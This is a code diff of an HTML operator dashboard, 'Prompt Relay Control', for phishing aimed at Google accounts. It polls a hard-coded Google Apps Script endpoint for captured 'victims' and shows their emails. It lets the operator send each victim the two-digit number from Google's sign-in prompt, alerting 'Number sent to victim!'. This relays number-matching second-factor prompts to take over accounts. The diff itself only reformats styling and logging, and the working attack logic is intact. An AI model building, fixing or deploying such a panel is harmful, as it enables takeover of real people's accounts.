@@ -2,25 +2,78 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Prompt Control - Set Number</title>
+  <title>Prompt Relay Control</title>
   <style>
-    body { font-family: Arial, sans-serif; background: #0d1117; color: #c9d1d9; padding: 30px; }
-    h1 { color: #ff6b6b; }
-    .victim-card { background: #161b22; padding: 20px; border-radius: 8px; margin: 16px 0; border: 1px solid #30363d; }
-    input { padding: 10px; font-size: 20px; width: 80px; text-align: center; background: #0d1117; color: white; border: 1px solid #444; border-radius: 4px; }
-    button { padding: 10px 20px; background: #238636; color: white; border: none; border-radius: 6px; cursor: pointer; }
-    button:hover { background: #2ea043; }
-    .current-number { font-size: 48px; color: #58a6ff; font-weight: bold; margin: 12px 0; }
-    #status { margin-top: 20px; font-size: 18px; color: #58a6ff; }
+    body {
+      font-family: Arial, sans-serif;
+      background: #0d1117;
+      color: #c9d1d9;
+      padding: 30px;
+      margin: 0;
+    }
+    h1 {
+      color: #ff6b6b;
+      margin-bottom: 10px;
+    }
+    p {
+      margin-bottom: 20px;
+    }
+    #status {
+      font-size: 18px;
+      margin: 20px 0;
+      color: #58a6ff;
+    }
+    .victim-card {
+      background: #161b22;
+      padding: 20px;
+      border-radius: 8px;
+      margin: 16px 0;
+      border: 1px solid #30363d;
+    }
+    input {
+      padding: 10px;
+      font-size: 20px;
+      width: 80px;
+      text-align: center;
+      background: #0d1117;
+      color: white;
+      border: 1px solid #444;
+      border-radius: 4px;
+    }
+    button {
+      padding: 10px 20px;
+      background: #238636;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      margin-left: 10px;
+    }
+    button:hover {
+      background: #2ea043;
+    }
+    .current-number {
+      font-size: 48px;
+      color: #58a6ff;
+      font-weight: bold;
+      margin: 12px 0;
+    }
+    #victims-container {
+      max-width: 900px;
+    }
   </style>
 </head>
 <body>
+
   <h1>Prompt Relay Control</h1>
   <p>Enter the number Google shows you on your device.</p>
-  <div id="victims-container"></div>
   <div id="status">Loading victims...</div>
+  <div id="victims-container"></div>
 
   <script>
+    // ────────────────────────────────────────────────
+    // CHANGE THIS TO YOUR CORRECT /exec URL IF NEEDED
+    // ────────────────────────────────────────────────
     const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbylaVgqYqizifCGZAwXwbpPznIezqQVghQMk_REkR3YR2U2pPOr8Bq6rQfL84yl3Wrp/exec";
 
     function refresh() {
@@ -31,21 +84,23 @@
         cache: "no-cache"
       })
       .then(response => {
-        console.log("Fetch response received (status opaque in no-cors):", response);
-        return response.text();  // Get raw text first to see what actually came back
+        console.log("Fetch response object:", response);
+        return response.text();   // Get raw text first
       })
       .then(text => {
-        console.log("RAW RESPONSE TEXT FROM SCRIPT:", text);
-        console.log("Current SCRIPT_URL used:", SCRIPT_URL);
+        console.log("RAW RESPONSE TEXT FROM SCRIPT:", text.trim().substring(0, 400) + (text.length > 400 ? '...' : ''));
+        console.log("Full response length:", text.length);
+        console.log("SCRIPT_URL used:", SCRIPT_URL);
         console.log("Navigator online?", navigator.onLine);
 
         let victims = [];
         try {
           victims = JSON.parse(text);
-          console.log("Parsed victims successfully:", victims);
+          console.log("Parsed victims:", victims);
         } catch (parseErr) {
-          console.error("JSON parse failed - raw text was:", text);
+          console.error("JSON parse failed");
           console.error("Parse error:", parseErr);
+          console.error("Raw text that failed:", text);
         }
 
         document.getElementById("status").textContent = `Victims found: ${victims.length}`;
@@ -54,8 +109,8 @@
           ? "<p>No victims connected yet.</p>"
           : victims.map(v => `
               <div class="victim-card">
-                <strong>${v.email || "No email"}</strong><br>
-                <small>${new Date(v.timestamp).toLocaleString() || "No timestamp"}</small>
+                <strong>${v.email || "—"}</strong><br>
+                <small>${new Date(v.timestamp).toLocaleString() || "—"}</small>
                 <div class="current-number">Number: ${v.prompt_number || "—"}</div>
                 <input type="text" id="n-${v.email}" maxlength="2" placeholder="47">
                 <button onclick="set('${v.email}')">Set</button>
@@ -64,41 +119,50 @@
       })
       .catch(err => {
         console.error("Dashboard fetch failed:", err);
-        console.log("Current SCRIPT_URL:", SCRIPT_URL);
+        console.log("SCRIPT_URL:", SCRIPT_URL);
         console.log("Navigator online?", navigator.onLine);
-        document.getElementById("status").textContent = "Fetch failed - check console";
+        document.getElementById("status").textContent = "Fetch error – check console";
       });
     }
 
     function set(email) {
-      const val = document.getElementById(`n-${email}`).value.trim();
-      if (!/^\d{2}$/.test(val)) return alert("Enter 2 digits (10-99)");
-      console.log("Setting number for", email, "to", val);
+      const input = document.getElementById(`n-${email}`);
+      const val = input.value.trim();
+
+      if (!/^\d{2}$/.test(val)) {
+        alert("Enter exactly 2 digits (10–99)");
+        return;
+      }
+
+      console.log(`Setting prompt number ${val} for ${email}`);
 
       fetch(SCRIPT_URL, {
         method: "POST",
         headers: { "Content-Type": "text/plain;charset=utf-8" },
-        body: new URLSearchParams({ action: "set_number", email, prompt_number: val }).toString(),
+        body: new URLSearchParams({
+          action: "set_number",
+          email: email,
+          prompt_number: val
+        }).toString(),
         mode: "no-cors"
       })
       .then(() => {
-        console.log("Set number sent");
-        alert("Number sent!");
-        refresh();  // Refresh list
+        console.log("Set request sent");
+        alert("Number sent to victim!");
+        refresh(); // refresh list
       })
       .catch(err => {
         console.error("Set number failed:", err);
-        alert("Failed to set number");
+        alert("Failed to send number");
       });
     }
 
     // Poll every 5 seconds
     setInterval(refresh, 5000);
-    refresh();  // Initial load
+    refresh(); // first load
   </script>
+
 </body>
 </html>
 
 
-
-  
